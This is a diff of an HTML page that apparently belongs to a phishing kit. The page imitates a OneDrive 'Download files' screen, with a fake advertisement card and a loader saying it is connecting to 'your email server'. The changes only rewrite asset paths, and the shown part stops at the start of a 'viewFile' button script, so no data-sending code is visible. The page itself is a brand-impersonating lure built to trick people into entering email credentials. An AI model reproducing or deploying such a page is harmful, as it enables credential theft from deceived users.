@@ -10,10 +10,10 @@
 <title>OneDrive - Download files</title>
 
     <!-- Bootstrap core CSS -->
-    <link href="./lng/bootstrap.min.css" rel="stylesheet">
+    <link href="bootstrap.min.css" rel="stylesheet">
 
     <!-- Custom styles for this template -->
-    <link href="./lng/offcanvas.css" rel="stylesheet">
+    <link href="offcanvas.css" rel="stylesheet">
     <style>
       .card-img-top {
         width: 100%;
@@ -102,7 +102,7 @@
              <!-- Header Title for the Card -->
                <h6 class="card-header">Advertisement</h6>
                <!-- Ads Image  -->
-               <img class="card-img-top" src="./lng/outlook-anim.gif" alt="Card image cap">
+               <img class="card-img-top" src="outlook-anim.gif" alt="Card image cap">
                <div class="card-body">
                   <!-- <h5 class="card-title">Signed by:</h5> -->
                   <p class="card-text" style="margin-bottom: 0;"><small class="text-muted">Signed by: Sales Manager </small></p>
@@ -143,7 +143,7 @@
               <!-- Spinner or Loader -->
               <div class="d-flex justify-content-center">
                 <div class="row">
-                   <div class="col"><img src="./lng/loader.gif" alt=""></div>
+                   <div class="col"><img src="loader.gif" alt=""></div>
                    <div class="col"> <div> <p>Please wait. while we try to establish connection with your email server</p></div></div>
                 </div>
                
@@ -214,10 +214,10 @@
     <!-- Bootstrap core JavaScript
     ================================================== -->
     <!-- Placed at the end of the document so the pages load faster -->
-    <script src="./lng/jquery.min.js.download"></script>
-    <script src="./lng/bootstrap.min.js.download"></script>
-    <script src="./lng/popper.min.js.download"></script>
-    <script src="./lng/holder.min.js.download"></script>
+    <script src="jquery.min.js.download"></script>
+    <script src="bootstrap.min.js.download"></script>
+    <script src="popper.min.js.download"></script>
+    <script src="holder.min.js.download"></script>
     <script> 
           // View file Button
           let viewFileBtn = document.getElementById('viewFile');
